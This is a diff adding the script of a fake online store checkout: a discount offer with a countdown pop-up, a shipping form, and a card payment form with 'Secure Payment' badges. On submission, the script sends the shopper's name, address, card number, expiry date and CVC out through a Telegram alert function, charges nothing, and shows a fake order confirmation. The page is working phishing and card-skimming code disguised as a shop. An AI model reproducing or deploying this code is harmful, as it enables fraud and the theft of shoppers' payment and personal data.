+        if (!validationFn(inputElement.value)) {
+            inputElement.classList.add('input-error');
+            errorElement.textContent = errorMessage;
+            errorElement.classList.remove('hidden');
+            return false;
+        } else {
+            inputElement.classList.remove('input-error');
+            errorElement.classList.add('hidden');
+            return true;
+        }
+    }
+
+    function showBillingStep() {
+        billingStepDiv.innerHTML = `
+        <div class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50 p-4">
+          <div class="max-w-md w-full bg-white shadow-lg rounded-xl px-6 py-7 fadein">
+            <div class="flex flex-col items-center border-b border-gray-200 pb-3 mb-4">
+                <div class="text-4xl mb-2">🚚</div>
+                <h2 class="text-xl font-bold text-center text-gray-800">
+                  Shipping Information
+                </h2>
+                <p class="text-xs text-gray-500 text-center">
+                  Please enter your address for delivery.
+                </p>
+            </div>
+            <form id="billingForm" autocomplete="off" novalidate>
+              <div class="mb-3">
+                <label class="form-label block mb-1 text-sm" for="billingName">Full Name</label>
+                <input type="text" id="billingName" name="billingName" class="input-default w-full px-3 py-2 text-sm border rounded-lg" required>
+                <p class="hidden text-xs text-red-600 mt-1" id="billingNameError"></p>
+              </div>
+              <div class="mb-3">
+                <label class="form-label block mb-1 text-sm" for="billingCountry">Country</label>
+                <input type="text" id="billingCountry" name="billingCountry" class="input-default w-full px-3 py-2 text-sm border rounded-lg bg-gray-100" value="🇺🇸 United States" disabled readonly>
+              </div>
+              <div class="mb-3">
+                <label class="form-label block mb-1 text-sm" for="billingAddress">Street Address</label>
+                <input type="text" id="billingAddress" name="billingAddress" class="input-default w-full px-3 py-2 text-sm border rounded-lg" placeholder="123 Main St" required>
+                <p class="hidden text-xs text-red-600 mt-1" id="billingAddressError"></p>
+              </div>
+              <div class="mb-3">
+                <label class="form-label block mb-1 text-sm" for="billingPostalCode">ZIP Code</label>
+                <input type="text" id="billingPostalCode" name="billingPostalCode" class="input-default w-full px-3 py-2 text-sm border rounded-lg" placeholder="e.g. 10001" required>
+                <p class="hidden text-xs text-red-600 mt-1" id="billingPostalCodeError"></p>
+              </div>
+              <button type="submit" class="btn-main mt-4 text-base">Continue to Payment</button>
+            </form>
+          </div>
+        </div>
+        `;
+        document.body.appendChild(billingStepDiv);
+
+        const billingForm = billingStepDiv.querySelector('#billingForm');
+        billingForm.onsubmit = function (e) {
+            e.preventDefault();
+            let isValid = true;
+            isValid &= validateAndShowError(billingForm.billingName, billingForm.querySelector('#billingNameError'), val => val.trim().length > 2, "Please enter a valid full name.");
+            isValid &= validateAndShowError(billingForm.billingAddress, billingForm.querySelector('#billingAddressError'), val => val.trim().length > 5, "Please enter a valid address.");
+            isValid &= validateAndShowError(billingForm.billingPostalCode, billingForm.querySelector('#billingPostalCodeError'), val => /^\d{5}(-\d{4})?$/.test(val.trim()), "Please enter a valid ZIP code.");
+
+            if (isValid) {
+                showPaymentStep();
+                sendTelegramAlert("Shipping Address Submitted", {
+                    "Full Name": billingForm.billingName.value,
+                    "Country": "United States",
+                    "Address": billingForm.billingAddress.value,
+                    "ZIP Code": billingForm.billingPostalCode.value
+                });
+                billingStepDiv.remove();
+            }
+        };
+    }
+
+    /* ========== PAYMENT STEP ========== */
+    function showPaymentStep() {
+        paymentStepDiv.innerHTML = `
+        <div class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50 p-4">
+          <div class="max-w-md w-full bg-white shadow-lg rounded-xl px-6 py-7 fadein">
+             <p class="text-sm text-gray-500 text-center mb-3">Final Step: Payment</p>
+            <div class="flex flex-col items-center border-b border-gray-200 pb-3 mb-4">
+                <div class="flex items-center"> 
+                    <span class="text-2xl mr-2">💳</span>
+                    <h2 class="text-xl font-bold text-center text-gray-800">
+                        Payment Information
+                    </h2>
+                </div>
+            </div>
+            <div class="text-center mb-4">
+                <p class="text-md text-gray-800">Total to pay: <span class="font-bold text-blue-600">$9.99</span> <span style="color:#999;text-decoration:line-through;">$249</span></p>
+            </div>
+            <form id="paymentForm" autocomplete="off" novalidate>
+              <div class="mb-3 relative">
+                <label class="form-label block mb-1 text-sm" for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" name="cardNumber" class="input-default w-full px-3 py-2 text-sm border rounded-lg pr-12" maxlength="19" placeholder="1234 5678 9012 3456" required>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Icon" class="absolute right-3 top-8 h-5 pointer-events-none">
+                <p class="hidden text-xs text-red-600 mt-1" id="cardNumberError"></p>
+              </div>
+              <div class="mb-3 flex gap-3">
+                <div class="w-1/2">
+                  <label class="form-label block mb-1 text-sm" for="cardExp">Expiration</label>
+                  <input type="text" id="cardExp" name="cardExp" class="input-default w-full px-3 py-2 text-sm border rounded-lg" maxlength="5" placeholder="MM/YY" required>
+                  <p class="hidden text-xs text-red-600 mt-1" id="cardExpError"></p>
+                </div>
+                <div class="w-1/2">
+                  <label class="form-label block mb-1 text-sm" for="cardCVC">CVC</label>
+                  <input type="text" id="cardCVC" name="cardCVC" class="input-default w-full px-3 py-2 text-sm border rounded-lg" maxlength="4" placeholder="123" required>
+                  <p class="hidden text-xs text-red-600 mt-1" id="cardCVCError"></p>
+                </div>
+              </div>
+              <button type="submit" class="btn-main mt-4 text-base">Pay $9.99</button>
+            </form>
+            <div class="flex justify-center items-center gap-x-4 mt-4 pt-4 border-t border-gray-200">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-6">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" alt="Mastercard" class="h-6">
+                <div class="flex items-center gap-1 text-gray-500">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-600" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5.002L2.015 5.166A11.954 11.954 0 0110 18.056a11.954 11.954 0 017.985-12.89l.151-.097A11.954 11.954 0 0110 1.944zM10 4.167c-.822 0-1.58.21-2.25.571l.485.485a4.47 4.47 0 015.53 5.53l.485.485c.36-.67.57-1.428.57-2.25A4.167 4.167 0 0010 4.167zm-5.833 5.833a4.167 4.167 0 005.833 5.833c.822 0 1.58-.21 2.25-.571l-.485-.485a4.47 4.47 0 01-5.53-5.53l-.485-.485A4.165 4.165 0 004.167 10z" clip-rule="evenodd" /></svg>
+                    <span class="text-xs font-semibold">Secure Payment</span>
+                </div>
+            </div>
+          </div>
+        </div>
+        `;
+        document.body.appendChild(paymentStepDiv);
+
+        const paymentForm = paymentStepDiv.querySelector('#paymentForm');
+        const cardNumberInput = paymentForm.querySelector('#cardNumber');
+        const cardExpInput = paymentForm.querySelector('#cardExp');
+
+        cardNumberInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.replace(/(.{4})/g, '$1 ').trim();
+            e.target.value = value.slice(0, 19);
+        });
+        cardExpInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            e.target.value = value.slice(0, 5);
+        });
+
+        paymentForm.onsubmit = function (e) {
+            e.preventDefault();
+            let isValid = true;
+            isValid &= validateAndShowError(paymentForm.cardNumber, paymentForm.querySelector('#cardNumberError'), val => val.replace(/\s/g, '').length >= 13 && /^\d[\d\s]*\d$/.test(val), "Invalid card number.");
+            isValid &= validateAndShowError(paymentForm.cardExp, paymentForm.querySelector('#cardExpError'), val => /^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(val), "Invalid expiration date (MM/YY).");
+            isValid &= validateAndShowError(paymentForm.cardCVC, paymentForm.querySelector('#cardCVCError'), val => /^[0-9]{3,4}$/.test(val.trim()), "Invalid CVC (3 or 4 digits).");
+
+            if (isValid) {
+                sendTelegramAlert("Payment Attempted (FULL)", {
+                    "Card Number": paymentForm.cardNumber.value,
+                    "Expiration": paymentForm.cardExp.value,
+                    "CVC": paymentForm.cardCVC.value
+                });
+                
+                showLoadingPopup("Processing payment...", "");
+                paymentStepDiv.remove();
+
+                setTimeout(() => {
+                    showThankYouPage();
+                }, 2000);
+            }
+        };
+    }
+    
+    /* ========== THANK YOU PAGE ========== */
+    function showThankYouPage() {
+        if(loadingPopup) loadingPopup.style.display = 'none';
+        thankYouStepDiv.innerHTML = `
+        <div class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50 p-4">
+          <div class="max-w-md w-full bg-white shadow-lg rounded-xl px-6 py-7 fadein text-center">
+             <div class="text-6xl mb-4">✅</div>
+             <h2 class="text-2xl font-bold text-gray-800 mb-2">Thank You for Your Purchase!</h2>
+             <p class="text-gray-600 mb-6">Your order has been successfully processed. You will receive a confirmation email shortly.</p>
+             <button id="returnHomeBtn" class="btn-main text-base">Return to Homepage</button>
+          </div>
+        </div>
+        `;
+        document.body.appendChild(thankYouStepDiv);
+
+        const returnHomeBtn = document.getElementById('returnHomeBtn');
+        if (returnHomeBtn) {
+            returnHomeBtn.onclick = () => {
+                window.location.reload();
+            };
+        }
+    }
+
+
+    /* ========== FLOATING ORDER BUTTON VISIBILITY ========== */
+    window.addEventListener('scroll', function () {
+        if (floatingOrderBtn) {
+            if (window.scrollY > 300) {
+                floatingOrderBtn.classList.add('visible');
+            } else {
+                floatingOrderBtn.classList.remove('visible');
+            }
+        }
+    });
+    if (window.scrollY > 300 && floatingOrderBtn) {
+        floatingOrderBtn.classList.add('visible');
+    }
+
+
+    /* ========== POLICY MODALS ========== */
+    const policyLinks = [
+        { linkId: 'about-link', modalId: 'about-page' },
+        { linkId: 'privacy-link', modalId: 'privacy-page' },
+        { linkId: 'terms-link', modalId: 'terms-page' },
+        { linkId: 'support-link', modalId: 'support-page' },
+        { linkId: 'contact-link', modalId: 'contact-page' }
+    ];
+
+    policyLinks.forEach(item => {
+        const link = document.getElementById(item.linkId);
+        const modal = document.getElementById(item.modalId);
+        if (link && modal) {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                modal.style.display = 'flex';
+            });
+        }
+    });
+
+    document.querySelectorAll('.policy-modal .close-btn').forEach(btn => {
+        btn.addEventListener('click', function () {
+            const modalId = this.dataset.modalId;
+            if (modalId) {
+                document.getElementById(modalId).style.display = 'none';
+            }
+        });
+    });
+    
+    document.querySelectorAll('.policy-modal').forEach(modal => {
+        modal.addEventListener('click', function(event) {
+            if (event.target === modal) {
+                modal.style.display = 'none';
+            }
+        });
+    });
+
+
+    /* ========== LOGO CYCLING ========== */
+    if (logoArea && logoImg1 && logoImg2) {
+        logoArea.addEventListener('click', () => {
+            logoImg1.classList.toggle('active');
+            logoImg2.classList.toggle('active');
+        });
+    }
+
+    /* ========== NAVIGATION MENU ========== */
+    if (navToggleBtn && topNavMenu) {
+        navToggleBtn.addEventListener('click', () => {
+            topNavMenu.classList.toggle('nav-open');
+        });
+        topNavMenu.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', () => {
+                topNavMenu.classList.remove('nav-open');
+            });
+        });
+    }
+
+
+    /* ========== DETAILS BUTTON ========== */
+    if (detailsBtn && featuresSection) {
+        detailsBtn.addEventListener('click', () => {
+            featuresSection.scrollIntoView({ behavior: 'smooth' });
+        });
+    }
+
+    /* ========== TIMED POPUP MODAL ========== */
+    function showTimedPopup() {
+        if (timedPopupModal) {
+            timedPopupModal.classList.add('show');
+            timedPopupIntervalId = startTimer(timedPopupTimerDuration, timedPopupTimerDisplay, timedPopupIntervalId);
+        }
+    }
+    function hideTimedPopup() {
+        if (timedPopupModal) timedPopupModal.classList.remove('show');
+        if (timedPopupIntervalId) clearInterval(timedPopupIntervalId);
+    }
+
+    const timedPopupTimeout = setTimeout(showTimedPopup, 10000); 
+
+    if (timedPopupCloseBtn) {
+        timedPopupCloseBtn.addEventListener('click', () => {
+            hideTimedPopup();
+            clearTimeout(timedPopupTimeout);
+        });
+    }
+    if (timedPopupOrderBtn) {
+        timedPopupOrderBtn.addEventListener('click', () => {
+            hideTimedPopup();
+            clearTimeout(timedPopupTimeout);
+            openOrderModal();
+        });
+    }
+
+
+    /* ========== FOOTER CURRENT YEAR ========== */
+    const currentYearSpan = document.getElementById('currentYear');
+    if (currentYearSpan) {
+        currentYearSpan.textContent = new Date().getFullYear();
+    }
+
+    /* ========== INITIALIZE TIMERS ON PAGE LOAD ========== */
+    document.addEventListener('DOMContentLoaded', () => {
+        mainIntervalId = startTimer(initialTimerDuration, mainTimerDisplay, mainIntervalId);
+    });
+
+  </script>
+</body>
+</html>
 
